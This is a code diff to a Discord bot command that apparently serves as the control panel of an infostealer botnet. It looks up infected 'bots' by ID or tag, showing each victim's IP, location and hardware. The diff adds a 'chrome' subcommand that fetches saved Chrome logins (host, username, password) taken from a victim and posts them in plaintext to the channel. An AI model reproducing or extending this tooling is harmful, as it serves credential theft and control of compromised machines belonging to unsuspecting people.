@@ -38,7 +38,7 @@ exports.run = (client, message, args) => {
 
             paginationEmbed(message, pages);
         });
-    } else {
+    } else if (args.length == 1) {
         db.Bots.findAll({
             where: {
                 [Op.or]: [
@@ -50,18 +50,22 @@ exports.run = (client, message, args) => {
                     },
                 ],
             },
-        }).then((results) => {
+        }).then(async (results) => {
             if (results.length > 0) {
                 const element = results[0];
+                const chromeData = await db.Chrome.findAll({
+                    where: {
+                        identifier: element.identifier
+                    }
+                });
+                const chromeLength = chromeData.length;
+
                 const embed = new Discord.MessageEmbed()
                     .setColor("#0099ff")
                     .addFields({
-                        name: element.ipAddress,
+                        name: !element.tag ? "No tag found" : element.tag,
                         value: `
                             **ID**: ${element.id}
-                            **Tag**: ${
-                                !element.tag ? "No tag found" : element.tag
-                            }
                             **IP Address**: ${element.ipAddress}
                             **Country**: ${element.country}
                             **Region**: ${element.region}
@@ -78,7 +82,8 @@ exports.run = (client, message, args) => {
                             **Architecture**: ${element.architecture}
                             **Boot Time**: ${element.bootTime}
                             **Cores**: ${element.cpuCores}
-                            **Memory**: ${element.memory}`,
+                            **Memory**: ${element.memory}
+                            **Available Info**: \`Chrome ${chromeLength}\``,
                     })
                     .setThumbnail(
                         `https://www.countryflags.io/${element.countryCode}/flat/64.png`
@@ -90,5 +95,40 @@ exports.run = (client, message, args) => {
                 message.channel.send("Client not found");
             }
         });
+    } else if (args.length == 2) {
+        if (args[1] == "chrome") {
+            db.Bots.findAll({
+                where: {
+                    [Op.or]: [
+                        {
+                            id: args[0],
+                        },
+                        {
+                            tag: args[0],
+                        },
+                    ],
+                },
+            }).then(async (result) => {
+                if (result.length > 0) {
+                    db.Chrome.findAll({
+                        where: {
+                            identifier: result[0].identifier
+                        }
+                    }).then((results) => {
+                        if (results.length > 0) {
+                            let output = "";
+                            results.forEach(element => {
+                                output = output + `HOST:${element.host}\nUSERNAME:${element.user}\nPASSWORD:${element.password}\n====================================\n`;
+                            });
+                            message.channel.send("```" + output + "```");
+                        } else {
+                            message.channel.send("No Chrome data found");
+                        }
+                    });
+                } else {
+                    message.channel.send("Client not found")
+                }
+            });
+        }
     }
 };
